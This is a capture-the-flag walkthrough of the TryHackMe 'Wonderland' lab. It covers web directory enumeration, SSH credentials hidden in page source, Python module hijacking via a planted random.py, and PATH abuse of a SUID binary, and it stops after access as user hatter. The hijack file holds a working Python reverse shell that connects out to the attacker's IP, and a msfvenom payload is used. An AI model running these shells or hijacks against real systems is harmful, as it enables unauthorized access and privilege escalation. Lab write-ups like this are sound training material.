#### TryHackMe : https://tryhackme.com/room/wonderland
#Fall down the rabbit hole and enter wonderland.

First we do a simple Nmap scan and reveal only port 80 and 22 are open on this machine. After visiting the website, we can see an image of a white rabbit and the page tells us to follow it.


`gobuster dir --url http://10.10.97.210/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt`

After we find the /r/ dir, it tells us to keep going. I run the same command on /r/ and find /r/a/, from this point on i figured its probably /r/a/b/b/i/t/. When we open http://10.10.97.210/r/a/b/b/i/t/ We see a page telling us to open the door.

If we inspect the source of this page, we find `alice:HowDothTheLittleCrocodileImproveHisShiningTail` hidden in the source. Since the webserver is probably a dead-end, this is possibly SSH credentials to login with. so we try it.

ssh alice@$TARIP
password: HowDothTheLittleCrocodileImproveHisShiningTail

This logs us in successfully on the target machine.


with sudo -l (Using previous password) we can check what commands we can run as sudo
```
sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py

```
This means we can execute that exact command and be the user rabbit while doing it.

  `sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py`

We can check in walrus_and_the_carpenter.py that it imports the package `import random`, maybe we can do somethign with this. In Python you can check paths on how the "packages" are initialized.

```
python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

This shows us that the first path python checks is '', so inside the home folder we should create a random.py which creates a reverse shell.


```
print('Hallo World!');
import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.14.12.121",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh");
```

With the reverse shell, we are now logged in as Rabbit on the target machine!

This shows us a executeable called "teaParty" with the SUID bit set

We use "strings" on this and see that it calls /bin/echo and "date" in a relative path...
We craft a reverse shell executable with msfvenom and set the $PATH var to include the local path.

`export PATH=/home/rabbit:/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin`
and name the msfvenom elf "date".
This gives us a reverse shell as "hatter" in /home/hatter we see a password.txt and we now have shell access as hatter.

password.txt : WhyIsARavenLikeAWritingDesk?
User: hatter
